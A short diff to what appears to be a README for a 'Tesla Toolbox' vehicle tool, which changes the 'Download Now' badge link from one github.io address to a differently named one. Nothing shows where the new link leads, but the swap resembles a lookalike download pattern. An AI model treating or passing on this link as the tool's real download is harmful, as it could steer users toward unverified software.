@@ -9,7 +9,7 @@ Install and launch the Proxy app to enable local vehicle connection.
 
 Use Google Chrome to navigate to the Toolbox web portal, log in with your Tesla account (with active subscription), and connect.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://tesla-toolbox.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://tesla-toolbox-download.github.io/.github/)
 
 ## ​ Overview
 A quick look at key parts in action:
